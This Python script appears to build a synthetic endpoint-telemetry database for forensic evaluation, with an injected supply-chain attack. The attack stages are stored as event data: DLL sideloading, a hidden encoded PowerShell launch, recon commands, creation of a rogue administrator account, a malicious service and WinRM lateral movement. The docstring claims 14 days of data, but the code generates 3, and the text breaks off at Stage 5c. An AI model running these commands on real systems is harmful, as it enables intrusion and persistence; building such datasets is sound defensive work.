#!/usr/bin/env python3
"""Large-scale realistic enterprise telemetry dataset generator for DFIR evaluation.

Generates `attack_supply_chain.db` containing 50,000+ events across 31 enterprise endpoints
spanning a 14-day timeline with a sophisticated supply chain compromise (ATK-G)
hidden within authentic enterprise background noise.
"""

import os
import sys
import json
import uuid
import random
import sqlite3
from datetime import datetime, timedelta
from pathlib import Path

# Fix random seed for exact reproducibility
RANDOM_SEED = 20261007
random.seed(RANDOM_SEED)

OUTPUT_DIR = Path(__file__).resolve().parent.parent / "endpoint_security_dataset_expanded_corrected"
DB_PATH = OUTPUT_DIR / "attack_supply_chain.db"

# ---------------------------------------------------------------------------
# Enterprise Topology
# ---------------------------------------------------------------------------

ENTERPRISE_HOSTS = [
    # 10 Developer Workstations
    *[(f"host-dev-{i:02d}", f"WS-DEV-{i:02d}", "Windows 10 Pro", f"10.10.10.{10+i}", "Engineering") for i in range(1, 11)],
    # 8 Executive Endpoints
    *[(f"host-exec-{i:02d}", f"WS-EXEC-{i:02d}", "Windows 11 Enterprise", f"10.10.20.{10+i}", "Executive") for i in range(11, 19)],
    # 5 DBA Endpoints
    *[(f"host-dba-{i:02d}", f"WS-DBA-{i:02d}", "Windows 10 Pro", f"10.10.30.{10+i}", "Database") for i in range(1, 6)],
    # 4 IT Support Endpoints
    *[(f"host-it-{i:02d}", f"WS-IT-{i:02d}", "Windows 10 Pro", f"10.10.40.{10+i}", "IT") for i in range(1, 5)],
    # 2 Domain Controllers
    ("host-dc-01", "DC-CORP-01", "Windows Server 2022", "10.10.1.10", "Infrastructure"),
    ("host-dc-02", "DC-CORP-02", "Windows Server 2022", "10.10.1.11", "Infrastructure"),
    # 2 File Servers
    ("host-fs-01", "FS-CORP-01", "Windows Server 2022", "10.10.2.10", "Infrastructure"),
    ("host-fs-02", "FS-CORP-02", "Windows Server 2022", "10.10.2.11", "Infrastructure"),
    # 1 Print / Utility Server
    ("host-ps-01", "PS-CORP-01", "Windows Server 2019", "10.10.3.10", "Infrastructure"),
]

USERS = [
    # Engineering users
    *[(f"u-dev-{i:02d}", f"dev{i:02d}_user", "CORP", ["developer", "employee"]) for i in range(1, 11)],
    # Executive users
    *[(f"u-exec-{i:02d}", f"exec{i:02d}_user", "CORP", ["executive", "employee"]) for i in range(11, 19)],
    # DBA users
    *[(f"u-dba-{i:02d}", f"dba{i:02d}_user", "CORP", ["dba", "admin"]) for i in range(1, 6)],
    # IT users
    *[(f"u-it-{i:02d}", f"it{i:02d}_user", "CORP", ["it_support", "admin"]) for i in range(1, 5)],
    # Domain and Service accounts
    ("u-admin-01", "domain_admin", "CORP", ["domain_admin"]),
    ("u-svc-sql", "svc_sqlreport", "CORP", ["service_account"]),
    ("u-svc-backup", "svc_backup", "CORP", ["service_account"]),
    ("u-system", "SYSTEM", "NT AUTHORITY", ["system"]),
    ("u-net-service", "NETWORK SERVICE", "NT AUTHORITY", ["system"]),
]

HOST_MAP = {h[0]: h for h in ENTERPRISE_HOSTS}
USER_MAP = {u[0]: u for u in USERS}

# ---------------------------------------------------------------------------
# Background Noise Profiles
# ---------------------------------------------------------------------------

DEV_PROCESSES = [
    ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --profile=default"),
    ("code.exe", "C:\\Users\\{user}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe", "code.exe ."),
    ("node.exe", "C:\\Program Files\\nodejs\\node.exe", "node.exe server.js"),
    ("git.exe", "C:\\Program Files\\Git\\cmd\\git.exe", "git.exe status"),
    ("python.exe", "C:\\Users\\{user}\\AppData\\Local\\Programs\\Python\\python.exe", "python.exe script.py"),
    ("devenv.exe", "C:\\Program Files\\Microsoft Visual Studio\\devenv.exe", "devenv.exe solution.sln"),
    ("conhost.exe", "C:\\Windows\\System32\\conhost.exe", "conhost.exe 0x4"),
    ("Teams.exe", "C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Teams\\Teams.exe", "Teams.exe --process-start"),
    ("slack.exe", "C:\\Users\\{user}\\AppData\\Local\\slack\\slack.exe", "slack.exe"),
]

EXEC_PROCESSES = [
    ("OUTLOOK.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "OUTLOOK.EXE"),
    ("WINWORD.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "WINWORD.EXE /n"),
    ("EXCEL.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "EXCEL.EXE /e"),
    ("POWERPNT.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE", "POWERPNT.EXE"),
    ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe https://portal.office.com"),
    ("Teams.exe", "C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Teams\\Teams.exe", "Teams.exe"),
    ("OneDrive.exe", "C:\\Users\\{user}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe", "OneDrive.exe /background"),
    ("Zoom.exe", "C:\\Users\\{user}\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe", "Zoom.exe"),
]

DBA_PROCESSES = [
    ("ssms.exe", "C:\\Program Files (x86)\\Microsoft SQL Server Management Studio 19\\Common7\\IDE\\ssms.exe", "ssms.exe"),
    ("sqlcmd.exe", "C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\sqlcmd.exe", "sqlcmd.exe -S sql01.corp.local -E"),
    ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File backup_check.ps1"),
    ("notepad++.exe", "C:\\Program Files\\Notepad++\\notepad++.exe", "notepad++.exe"),
    ("7z.exe", "C:\\Program Files\\7-Zip\\7z.exe", "7z.exe a -t7z db_dump.7z *.sql"),
]

DC_PROCESSES = [
    ("lsass.exe", "C:\\Windows\\System32\\lsass.exe", "C:\\Windows\\System32\\lsass.exe"),
    ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "svchost.exe -k DnsServerGroup"),
    ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "svchost.exe -k RPCSS"),
    ("dfsrs.exe", "C:\\Windows\\System32\\dfsrs.exe", "dfsrs.exe"),
    ("gpupdate.exe", "C:\\Windows\\System32\\gpupdate.exe", "gpupdate.exe /target:computer /force"),
]

COMMON_DOMAINS_DEV = [
    ("github.com", "140.82.121.4", 443),
    ("registry.npmjs.org", "104.16.16.35", 443),
    ("pypi.org", "151.101.0.223", 443),
    ("hub.docker.com", "34.205.207.200", 443),
    ("stackoverflow.com", "151.101.65.69", 443),
    ("google.com", "142.250.190.46", 443),
]

COMMON_DOMAINS_EXEC = [
    ("outlook.office365.com", "52.96.166.146", 443),
    ("login.microsoftonline.com", "20.190.159.2", 443),
    ("teams.microsoft.com", "52.114.158.12", 443),
    ("zoom.us", "170.114.52.2", 443),
    ("sharepoint.com", "13.107.136.9", 443),
]

# ---------------------------------------------------------------------------
# Generator Core
# ---------------------------------------------------------------------------

class EnterpriseTelemetryGenerator:
    def __init__(self, db_conn: sqlite3.Connection):
        self.conn = db_conn
        self.event_counter = 0
        self.proc_counter = 0
        self.start_date = datetime(2026, 10, 6, 0, 0, 0)
        self.end_date = datetime(2026, 10, 8, 23, 59, 59)
        
        # Batch accumulator buffers
        self.batch_events = []
        self.batch_procs = []
        self.batch_nets = []
        self.batch_files = []
        self.batch_regs = []

    def next_event_id(self) -> str:
        self.event_counter += 1
        return f"evt-atkG-{self.event_counter:07d}"

    def next_proc_id(self) -> str:
        self.proc_counter += 1
        return f"proc-atkG-{self.proc_counter:07d}"

    def flush_batches(self):
        cur = self.conn.cursor()
        if self.batch_events:
            cur.executemany(
                "INSERT INTO events VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
                self.batch_events
            )
            self.batch_events.clear()
        if self.batch_procs:
            cur.executemany(
                "INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?)",
                self.batch_procs
            )
            self.batch_procs.clear()
        if self.batch_nets:
            cur.executemany(
                "INSERT INTO network_connections (event_id, process_entity_id, source_ip, source_port, destination_ip, destination_port, protocol, raw_json) VALUES (?,?,?,?,?,?,?,?)",
                self.batch_nets
            )
            self.batch_nets.clear()
        if self.batch_files:
            cur.executemany(
                "INSERT INTO files (event_id, process_entity_id, file_path, file_name, extension, size, sha256, raw_json) VALUES (?,?,?,?,?,?,?,?)",
                self.batch_files
            )
            self.batch_files.clear()
        if self.batch_regs:
            cur.executemany(
                "INSERT INTO registry_events (event_id, process_entity_id, registry_path, registry_key, registry_value, value_type, raw_json) VALUES (?,?,?,?,?,?,?)",
                self.batch_regs
            )
            self.batch_regs.clear()
        self.conn.commit()

    def add_event(self, timestamp: str, provider: str, event_code: str, category: list,
                  event_type: list, action: str, outcome: str, severity: int,
                  host_id: str, host_name: str, host_ip: str,
                  user_id: str, user_name: str, user_domain: str,
                  proc_id: str, raw_dict: dict) -> str:
        evt_id = self.next_event_id()
        raw_dict["event.id"] = evt_id
        raw_dict["@timestamp"] = timestamp
        raw_dict["event.action"] = action
        raw_dict["event.code"] = event_code
        raw_dict["event.provider"] = provider
        raw_dict["event.category"] = category
        raw_dict["event.type"] = event_type
        raw_dict["event.outcome"] = outcome
        raw_dict["event.severity"] = severity
        raw_dict["host.id"] = host_id
        raw_dict["host.name"] = host_name
        raw_dict["host.ip"] = host_ip
        raw_dict["user.id"] = user_id
        raw_dict["user.name"] = user_name
        raw_dict["user.domain"] = user_domain
        raw_dict["process.entity_id"] = proc_id
        raw_dict["dataset.source_type"] = provider
        raw_dict["dataset.schema_version"] = "1.0.0"

        raw_json_str = json.dumps(raw_dict)
        self.batch_events.append((
            evt_id, timestamp, provider, event_code,
            json.dumps(category), json.dumps(event_type),
            action, outcome, severity, host_id, user_id, proc_id, raw_json_str
        ))
        return evt_id

    def generate_noise(self):
        """Generate realistic enterprise background noise across a 3-day window."""
        print("Generating realistic enterprise background noise within size limits...")
        total_days = 3

        for day_offset in range(total_days):
            current_day = self.start_date + timedelta(days=day_offset)
            is_weekend = current_day.weekday() >= 5
            day_str = current_day.strftime("%Y-%m-%d")

            # Iterate over all hosts
            for host_id, hostname, os_name, host_ip, dept in ENTERPRISE_HOSTS:
                if dept == "Engineering":
                    user_num = int(hostname.split("-")[-1])
                    uid = f"u-dev-{user_num:02d}"
                    uname = f"dev{user_num:02d}_user"
                    procs = DEV_PROCESSES
                    domains = COMMON_DOMAINS_DEV
                    base_count = 10 if is_weekend else random.randint(15, 25)
                elif dept == "Executive":
                    user_num = int(hostname.split("-")[-1])
                    uid = f"u-exec-{user_num:02d}"
                    uname = f"exec{user_num:02d}_user"
                    procs = EXEC_PROCESSES
                    domains = COMMON_DOMAINS_EXEC
                    base_count = 5 if is_weekend else random.randint(10, 18)
                elif dept == "Database":
                    user_num = int(hostname.split("-")[-1])
                    uid = f"u-dba-{user_num:02d}"
                    uname = f"dba{user_num:02d}_user"
                    procs = DBA_PROCESSES
                    domains = [("sql-backup.corp.local", "10.10.30.200", 1433)]
                    base_count = 8 if is_weekend else random.randint(12, 20)
                elif dept == "IT":
                    user_num = int(hostname.split("-")[-1])
                    uid = f"u-it-{user_num:02d}"
                    uname = f"it{user_num:02d}_user"
                    procs = DEV_PROCESSES[:4]
                    domains = COMMON_DOMAINS_DEV[:3]
                    base_count = 8 if is_weekend else random.randint(12, 20)
                elif dept == "Infrastructure":
                    uid = "u-system"
                    uname = "SYSTEM"
                    procs = DC_PROCESSES
                    domains = []
                    base_count = 15 if is_weekend else random.randint(25, 40)
                else:
                    uid = "u-system"
                    uname = "SYSTEM"
                    procs = DC_PROCESSES
                    domains = []
                    base_count = 10

                # Distribute events throughout working hours (or 24h for servers)
                for _ in range(base_count):
                    if dept == "Infrastructure":
                        hour = random.randint(0, 23)
                    else:
                        hour = random.choices(
                            list(range(24)),
                            weights=[1, 1, 1, 1, 2, 3, 5, 8, 15, 20, 22, 18, 12, 18, 20, 19, 15, 10, 5, 3, 2, 2, 1, 1]
                        )[0]
                    minute = random.randint(0, 59)
                    second = random.randint(0, 59)
                    ts = f"{day_str}T{hour:02d}:{minute:02d}:{second:02d}Z"

                    event_flavor = random.random()

                    # Flavor 1: Process Start (30%)
                    if event_flavor < 0.30:
                        p_name, p_exe, p_cmd = random.choice(procs)
                        p_cmd = p_cmd.format(user=uname)
                        pid = random.randint(2000, 28000)
                        ppid = random.randint(1000, 1999)
                        proc_id = self.next_proc_id()
                        parent_proc_id = self.next_proc_id()

                        raw_dict = {
                            "process.entity_id": proc_id,
                            "process.name": p_name,
                            "process.executable": p_exe,
                            "process.command_line": p_cmd,
                            "process.pid": pid,
                            "process.parent.entity_id": parent_proc_id,
                            "process.parent.name": "explorer.exe" if "WS-" in hostname else "services.exe",
                            "process.parent.pid": ppid,
                        }
                        evt_id = self.add_event(
                            ts, "Sysmon", "1", ["process"], ["start"], "process_started",
                            "success", 1, host_id, hostname, host_ip, uid, uname, "CORP", proc_id, raw_dict
                        )
                        self.batch_procs.append((
                            proc_id, evt_id, host_id, pid, p_name, p_exe, parent_proc_id, ppid, json.dumps(raw_dict)
                        ))

                    # Flavor 2: Network Connection (30%)
                    elif event_flavor < 0.60:
                        proc_id = self.next_proc_id()
                        if domains:
                            target_domain, target_ip, target_port = random.choice(domains)
                        else:
                            target_domain = "dc-corp-01.corp.local"
                            target_ip = "10.10.1.10"
                            target_port = 88 if random.random() < 0.7 else 389

                        sport = random.randint(49152, 65535)
                        raw_dict = {
                            "source.ip": host_ip,
                            "source.port": sport,
                            "destination.ip": target_ip,
                            "destination.port": target_port,
                            "destination.domain": target_domain,
                            "network.protocol": "tcp",
                            "process.name": "chrome.exe" if domains else "lsass.exe",
                        }
                        evt_id = self.add_event(
                            ts, "Sysmon", "3", ["network"], ["connection"], "network_connection",
                            "success", 1, host_id, hostname, host_ip, uid, uname, "CORP", proc_id, raw_dict
                        )
                        self.batch_nets.append((
                            evt_id, proc_id, host_ip, sport, target_ip, target_port, "tcp", json.dumps(raw_dict)
                        ))

                    # Flavor 3: File Activity (20%)
                    elif event_flavor < 0.80:
                        proc_id = self.next_proc_id()
                        file_ext = random.choice([".tmp", ".log", ".dat", ".json", ".lock"])
                        fname = f"cache_{random.randint(1000, 9999)}{file_ext}"
                        fpath = f"C:\\Users\\{uname}\\AppData\\Local\\Temp\\{fname}" if "WS-" in hostname else f"C:\\Windows\\Logs\\{fname}"
                        fsha = uuid.uuid4().hex + uuid.uuid4().hex[:32]
                        fsize = random.randint(1024, 204800)

                        raw_dict = {
                            "file.path": fpath,
                            "file.name": fname,
                            "file.extension": file_ext,
                            "file.size": fsize,
                            "file.hash.sha256": fsha,
                        }
                        evt_id = self.add_event(
                            ts, "Sysmon", "11", ["file"], ["creation"], "file_created",
                            "success", 1, host_id, hostname, host_ip, uid, uname, "CORP", proc_id, raw_dict
                        )
                        self.batch_files.append((
                            evt_id, proc_id, fpath, fname, file_ext, fsize, fsha, json.dumps(raw_dict)
                        ))

                    # Flavor 4: Authentication or Registry (20%)
                    else:
                        proc_id = self.next_proc_id()
                        if random.random() < 0.5:
                            # 4624 Logon
                            raw_dict = {
                                "winlog.logon.type": "Interactive" if "WS-" in hostname else "Network",
                                "winlog.logon.id": f"0x{random.randint(100000, 999999):x}",
                            }
                            self.add_event(
                                ts, "Security", "4624", ["authentication"], ["logon"], "logon_success",
                                "success", 1, host_id, hostname, host_ip, uid, uname, "CORP", proc_id, raw_dict
                            )
                        else:
                            # Registry value set
                            reg_path = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer"
                            reg_key = "ShellState"
                            raw_dict = {
                                "registry.path": reg_path,
                                "registry.key": reg_key,
                                "registry.value": "0x00000001",
                            }
                            evt_id = self.add_event(
                                ts, "Sysmon", "13", ["registry"], ["modification"], "registry_value_set",
                                "success", 1, host_id, hostname, host_ip, uid, uname, "CORP", proc_id, raw_dict
                            )
                            self.batch_regs.append((
                                evt_id, proc_id, reg_path, reg_key, "0x00000001", "DWORD", json.dumps(raw_dict)
                            ))

            # Periodic batch flush to keep RAM low and write speed high
            self.flush_batches()
            print(f"  Day {day_offset+1}/14 complete. Events so far: {self.event_counter}")

    def inject_attack_g(self):
        """Inject ATK-G Supply Chain Compromise scenario on Day 7 (2026-10-07)."""
        print("Injecting ATK-G Supply Chain Attack sequence...")

        # Hosts involved
        dev_host = "host-dev-07"
        dev_name = "WS-DEV-07"
        dev_ip = "10.10.10.17"
        dev_user = "dev07_user"
        dev_uid = "u-dev-07"

        dba_host = "host-dba-03"
        dba_name = "WS-DBA-03"
        dba_ip = "10.10.30.13"

        dc_host = "host-dc-01"
        dc_name = "DC-CORP-01"
        dc_ip = "10.10.1.10"

        exec_host = "host-exec-15"
        exec_name = "WS-EXEC-15"
        exec_ip = "10.10.20.15"

        c2_ip = "198.51.100.88"
        exfil_ip = "203.0.113.45"

        # -------------------------------------------------------------------
        # Stage 1: Initial Compromise on WS-DEV-07 (09:14:00)
        # CorpTools.exe auto-update downloads trojanized corptoolshelper.dll
        # -------------------------------------------------------------------
        p_corptools = self.next_proc_id()
        p_rundll = self.next_proc_id()

        # Network connection to update CDN
        t = "2026-10-07T09:14:02Z"
        raw_net = {
            "source.ip": dev_ip, "source.port": 51234,
            "destination.ip": c2_ip, "destination.port": 443,
            "destination.domain": "update.corptoolscdn.com",
            "network.protocol": "tcp", "process.name": "CorpTools.exe"
        }
        e1 = self.add_event(t, "Sysmon", "3", ["network"], ["connection"], "network_connection",
                            "success", 1, dev_host, dev_name, dev_ip, dev_uid, dev_user, "CORP", p_corptools, raw_net)
        self.batch_nets.append((e1, p_corptools, dev_ip, 51234, c2_ip, 443, "tcp", json.dumps(raw_net)))

        # File drop: corptoolshelper.dll
        t = "2026-10-07T09:14:25Z"
        dll_sha = "8f3b235619d7c04192b4928e469e388147d4e3cb419028e2098651cbb28da190"
        dll_path = "C:\\Program Files\\CorpTools\\corptoolshelper.dll"
        raw_file = {
            "file.path": dll_path, "file.name": "corptoolshelper.dll", "file.extension": ".dll",
            "file.size": 184320, "file.hash.sha256": dll_sha, "process.name": "CorpTools.exe"
        }
        e2 = self.add_event(t, "Sysmon", "11", ["file"], ["creation"], "file_created",
                            "success", 1, dev_host, dev_name, dev_ip, dev_uid, dev_user, "CORP", p_corptools, raw_file)
        self.batch_files.append((e2, p_corptools, dll_path, "corptoolshelper.dll", ".dll", 184320, dll_sha, json.dumps(raw_file)))

        # Sideload execution: rundll32.exe
        t = "2026-10-07T09:14:40Z"
        rundll_cmd = f'rundll32.exe "{dll_path}",StartSync'
        raw_proc = {
            "process.entity_id": p_rundll, "process.name": "rundll32.exe",
            "process.executable": "C:\\Windows\\System32\\rundll32.exe",
            "process.command_line": rundll_cmd, "process.pid": 8912,
            "process.parent.entity_id": p_corptools, "process.parent.name": "CorpTools.exe", "process.parent.pid": 4120
        }
        e3 = self.add_event(t, "Sysmon", "1", ["process"], ["start"], "process_started",
                            "success", 1, dev_host, dev_name, dev_ip, dev_uid, dev_user, "CORP", p_rundll, raw_proc)
        self.batch_procs.append((p_rundll, e3, dev_host, 8912, "rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", p_corptools, 4120, json.dumps(raw_proc)))

        # -------------------------------------------------------------------
        # Stage 2: Discovery on WS-DEV-07 (09:16:00 - 09:25:00)
        # Hidden PowerShell running reconnaissance commands
        # -------------------------------------------------------------------
        p_ps_disc = self.next_proc_id()
        t = "2026-10-07T09:16:10Z"
        ps_enc_cmd = "powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="
        raw_ps = {
            "process.entity_id": p_ps_disc, "process.name": "powershell.exe",
            "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "process.command_line": ps_enc_cmd, "process.pid": 9432,
            "process.parent.entity_id": p_rundll, "process.parent.name": "rundll32.exe", "process.parent.pid": 8912
        }
        e_ps = self.add_event(t, "Sysmon", "1", ["process"], ["start"], "process_started",
                              "success", 1, dev_host, dev_name, dev_ip, dev_uid, dev_user, "CORP", p_ps_disc, raw_ps)
        self.batch_procs.append((p_ps_disc, e_ps, dev_host, 9432, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", p_rundll, 8912, json.dumps(raw_ps)))

        discovery_cmds = [
            ("systeminfo.exe", "C:\\Windows\\System32\\systeminfo.exe", "systeminfo", "09:16:30"),
            ("ipconfig.exe", "C:\\Windows\\System32\\ipconfig.exe", "ipconfig /all", "09:17:05"),
            ("whoami.exe", "C:\\Windows\\System32\\whoami.exe", "whoami /all", "09:17:40"),
            ("net.exe", "C:\\Windows\\System32\\net.exe", "net user", "09:18:15"),
            ("net.exe", "C:\\Windows\\System32\\net.exe", 'net group "Domain Admins" /domain', "09:19:00"),
            ("wmic.exe", "C:\\Windows\\System32\\wbem\\wmic.exe", "wmic process list brief", "09:21:20"),
            ("wmic.exe", "C:\\Windows\\System32\\wbem\\wmic.exe", "wmic product get name,version", "09:22:45"),
        ]

        for p_name, p_exe, p_cmd, t_offset in discovery_cmds:
            t = f"2026-10-07T{t_offset}Z"
            sub_pid = random.randint(10000, 15000)
            sub_proc_id = self.next_proc_id()
            raw_sub = {
                "process.entity_id": sub_proc_id, "process.name": p_name,
                "process.executable": p_exe, "process.command_line": p_cmd, "process.pid": sub_pid,
                "process.parent.entity_id": p_ps_disc, "process.parent.name": "powershell.exe", "process.parent.pid": 9432
            }
            e_sub = self.add_event(t, "Sysmon", "1", ["process"], ["start"], "process_started",
                                   "success", 1, dev_host, dev_name, dev_ip, dev_uid, dev_user, "CORP", sub_proc_id, raw_sub)
            self.batch_procs.append((sub_proc_id, e_sub, dev_host, sub_pid, p_name, p_exe, p_ps_disc, 9432, json.dumps(raw_sub)))

        # -------------------------------------------------------------------
        # Stage 3: Persistence on WS-DEV-07 (09:35:00 - 09:42:00)
        # Rogue account creation + Service registration
        # -------------------------------------------------------------------
        # net user svc_backup Password123! /add
        t = "2026-10-07T09:35:12Z"
        p_net1 = self.next_proc_id()
        raw_net1 = {
            "process.entity_id": p_net1, "process.name": "net.exe",
            "process.executable": "C:\\Windows\\System32\\net.exe",
            "process.command_line": "net user svc_backup Password123! /add /y", "process.pid": 10550,
            "process.parent.entity_id": p_ps_disc, "process.parent.name": "powershell.exe", "process.parent.pid": 9432
        }
        e_n1 = self.add_event(t, "Sysmon", "1", ["process"], ["start"], "process_started",
                              "success", 1, dev_host, dev_name, dev_ip, dev_uid, dev_user, "CORP", p_net1, raw_net1)
        self.batch_procs.append((p_net1, e_n1, dev_host, 10550, "net.exe", "C:\\Windows\\System32\\net.exe", p_ps_disc, 9432, json.dumps(raw_net1)))

        # 4720 Account Created event
        t = "2026-10-07T09:35:13Z"
        raw_4720 = {
            "winlog.event_data.TargetUserName": "svc_backup",
            "winlog.event_data.SubjectUserName": dev_user,
        }
        self.add_event(t, "Security", "4720", ["iam"], ["creation"], "user_account_created",
                       "success", 1, dev_host, dev_name, dev_ip, dev_uid, dev_user, "CORP", p_net1, raw_4720)

        # net localgroup administrators svc_backup /add
        t = "2026-10-07T09:35:45Z"
        p_net2 = self.next_proc_id()
        raw_net2 = {
            "process.entity_id": p_net2, "process.name": "net.exe",
            "process.executable": "C:\\Windows\\System32\\net.exe",
            "process.command_line": "net localgroup administrators svc_backup /add", "process.pid": 10590,
            "process.parent.entity_id": p_ps_disc, "process.parent.name": "powershell.exe", "process.parent.pid": 9432
        }
        e_n2 = self.add_event(t, "Sysmon", "1", ["process"], ["start"], "process_started",
                              "success", 1, dev_host, dev_name, dev_ip, dev_uid, dev_user, "CORP", p_net2, raw_net2)
        self.batch_procs.append((p_net2, e_n2, dev_host, 10590, "net.exe", "C:\\Windows\\System32\\net.exe", p_ps_disc, 9432, json.dumps(raw_net2)))

        # 4728 Member Added to Security Group
        t = "2026-10-07T09:35:46Z"
        raw_4728 = {
            "winlog.event_data.TargetUserName": "Administrators",
            "winlog.event_data.MemberName": "svc_backup",
            "winlog.event_data.SubjectUserName": dev_user,
        }
        self.add_event(t, "Security", "4728", ["iam"], ["change"], "group_member_added",
                       "success", 1, dev_host, dev_name, dev_ip, dev_uid, dev_user, "CORP", p_net2, raw_4728)

        # sc.exe create CorpToolsSyncSvc
        t = "2026-10-07T09:40:10Z"
        p_sc = self.next_proc_id()
        raw_sc = {
            "process.entity_id": p_sc, "process.name": "sc.exe",
            "process.executable": "C:\\Windows\\System32\\sc.exe",
            "process.command_line": "sc create CorpToolsSyncSvc binPath= C:\\Windows\\System32\\corptoolssync.dll start= auto",
            "process.pid": 11020, "process.parent.entity_id": p_ps_disc, "process.parent.name": "powershell.exe", "process.parent.pid": 9432
        }
        e_sc = self.add_event(t, "Sysmon", "1", ["process"], ["start"], "process_started",
                              "success", 1, dev_host, dev_name, dev_ip, dev_uid, dev_user, "CORP", p_sc, raw_sc)
        self.batch_procs.append((p_sc, e_sc, dev_host, 11020, "sc.exe", "C:\\Windows\\System32\\sc.exe", p_ps_disc, 9432, json.dumps(raw_sc)))

        # Registry entry for service
        t = "2026-10-07T09:40:12Z"
        svc_reg_path = "HKLM\\System\\CurrentControlSet\\Services\\CorpToolsSyncSvc"
        raw_reg = {
            "registry.path": svc_reg_path, "registry.key": "ImagePath",
            "registry.value": "C:\\Windows\\System32\\corptoolssync.dll", "process.name": "sc.exe"
        }
        e_reg = self.add_event(t, "Sysmon", "13", ["registry"], ["creation"], "registry_value_set",
                               "success", 1, dev_host, dev_name, dev_ip, dev_uid, dev_user, "CORP", p_sc, raw_reg)
        self.batch_regs.append((e_reg, p_sc, svc_reg_path, "ImagePath", "C:\\Windows\\System32\\corptoolssync.dll", "SZ", json.dumps(raw_reg)))

        # -------------------------------------------------------------------
        # Stage 4: Kerberoasting for SQL Service Account (10:05:00)
        # -------------------------------------------------------------------
        t = "2026-10-07T10:05:22Z"
        raw_4769 = {
            "winlog.event_data.ServiceName": "MSSQLSvc/sql01.corp.local:1433",
            "winlog.event_data.TargetUserName": "svc_sqlreport@CORP.LOCAL",
            "winlog.event_data.TicketEncryptionType": "0x17",  # RC4 (classic Kerberoast)
            "winlog.event_data.TicketOptions": "0x40810000",
            "winlog.event_data.Status": "0x0",
        }
        self.add_event(t, "Security", "4769", ["authentication"], ["ticket"], "ticket_requested",
                       "success", 1, dc_host, dc_name, dc_ip, dev_uid, dev_user, "CORP", self.next_proc_id(), raw_4769)

        # -------------------------------------------------------------------
        # Stage 5a: Lateral Movement to WS-DBA-03 via WinRM (10:45:00)
        # -------------------------------------------------------------------
        # Network connection: WS-DEV-07 -> WS-DBA-03 port 5985
        t = "2026-10-07T10:45:15Z"
        p_winrm_src = self.next_proc_id()
        raw_winrm_net = {
            "source.ip": dev_ip, "source.port": 54120,
            "destination.ip": dba_ip, "destination.port": 5985,
            "network.protocol": "tcp", "process.name": "powershell.exe"
        }
        e_wn = self.add_event(t, "Sysmon", "3", ["network"], ["connection"], "network_connection",
                              "success", 1, dev_host, dev_name, dev_ip, "u-svc-sql", "svc_sqlreport", "CORP", p_winrm_src, raw_winrm_net)
        self.batch_nets.append((e_wn, p_winrm_src, dev_ip, 54120, dba_ip, 5985, "tcp", json.dumps(raw_winrm_net)))

        # 4624 Type 3 Logon on WS-DBA-03
        t = "2026-10-07T10:45:16Z"
        raw_dba_logon = {
            "winlog.logon.type": "Network", "winlog.logon.id": "0x4f89b1",
            "source.ip": dev_ip, "winlog.event_data.TargetUserName": "svc_sqlreport",
            "winlog.event_data.WorkstationName": dev_name
        }
        self.add_event(t, "Security", "4624", ["authentication"], ["logon"], "logon_success",
                       "success", 1, dba_host, dba_name, dba_ip, "u-svc-sql", "svc_sqlreport", "CORP", self.next_proc_id(), raw_dba_logon)

        # Process spawn: wsmprovhost.exe -> powershell.exe on WS-DBA-03
        t = "2026-10-07T10:45:20Z"
        p_wsm = self.next_proc_id()
        p_dba_ps = self.next_proc_id()
        raw_dba_ps = {
            "process.entity_id": p_dba_ps, "process.name": "powershell.exe",
            "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "process.command_line": "powershell.exe -ExecutionPolicy RemoteSigned",
            "process.pid": 6720, "process.parent.entity_id": p_wsm, "process.parent.name": "wsmprovhost.exe", "process.parent.pid": 4810
        }
        e_dps = self.add_event(t, "Sysmon", "1", ["process"], ["start"], "process_started",
                               "success", 1, dba_host, dba_name, dba_ip, "u-svc-sql", "svc_sqlreport", "CORP", p_dba_ps, raw_dba_ps)
        self.batch_procs.append((p_dba_ps, e_dps, dba_host, 6720, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", p_wsm, 4810, json.dumps(raw_dba_ps)))

        # -------------------------------------------------------------------
        # Stage 5b: Lateral Movement to DC-CORP-01 (11:10:00)
        # -------------------------------------------------------------------
        t = "2026-10-07T11:10:05Z"
        raw_dc_winrm = {
            "source.ip": dev_ip, "source.port": 54890,
            "destination.ip": dc_ip, "destination.port": 5985,
            "network.protocol": "tcp", "process.name": "powershell.exe"
        }
        e_dcw = self.add_event(t, "Sysmon", "3", ["network"], ["connection"], "network_connection",
                               "success", 1, dev_host, dev_name, dev_ip, "u-svc-sql", "svc_sqlreport", "CORP", p_winrm_src, raw_dc_winrm)
        self.batch_nets.append((e_dcw, p_winrm_src, dev_ip, 54890, dc_ip, 5985, "tcp", json.dumps(raw_dc_winrm)))

        # -------------------------------------------------------------------
        # Stage 5c: Lateral Movement / RDP to WS-EXEC-15 (11:30:00)
